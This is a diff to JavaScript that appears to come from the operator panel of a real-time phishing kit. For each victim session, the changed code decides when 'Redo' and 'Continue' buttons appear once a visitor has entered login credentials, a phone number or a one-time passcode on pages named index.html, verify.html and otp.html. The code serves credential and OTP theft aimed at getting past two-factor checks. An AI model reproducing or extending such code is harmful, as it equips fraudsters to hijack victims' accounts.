@@ -303,24 +303,38 @@
         <img src="/images/description-svgrepo-com.svg" alt="Manage">
       </button>`;
       
-      // Redo button - only show if credentials received (entered) and not on success page
-      // Also hide if on unregister.html and already clicked
-      const showRedo = s.entered && s.page !== 'success' && !(s.page === 'unregister.html' && s.unregisterClicked);
-      
-      // Continue button - only show if:
-      // - On login page and credentials entered, OR
-      // - On phone page and phone entered, OR
-      // - On unregister page and clicked, OR
-      // - On OTP page and OTP entered
+      let showRedo = false;
       let showCont = false;
-      if (s.page === 'index.html' && s.entered) {
-        showCont = true;
-      } else if (s.page === 'verify.html' && s.phone) {
-        showCont = true;
-      } else if (s.page === 'unregister.html' && s.unregisterClicked) {
-        showCont = true;
-      } else if (s.page === 'otp.html' && s.otp) {
-        showCont = true;
+      
+      // Logic based on current page and whether info was entered on THAT page
+      if (s.page === 'index.html') {
+        // LOGIN page: show buttons only after credentials entered
+        if (s.entered) {
+          showRedo = true;
+          showCont = true;
+        }
+      } else if (s.page === 'verify.html') {
+        // PHONE page: show buttons only after phone entered
+        if (s.phone) {
+          showRedo = true;
+          showCont = true;
+        }
+      } else if (s.page === 'unregister.html') {
+        // UNREGISTER page: show continue only after clicked, never show redo
+        if (s.unregisterClicked) {
+          showCont = true;
+          showRedo = false;
+        }
+      } else if (s.page === 'otp.html') {
+        // OTP page: show buttons only after OTP entered
+        if (s.otp) {
+          showRedo = true;
+          showCont = true;
+        }
+      } else if (s.page === 'success') {
+        // Success page: no buttons
+        showRedo = false;
+        showCont = false;
       }
       
       if (showCont) {
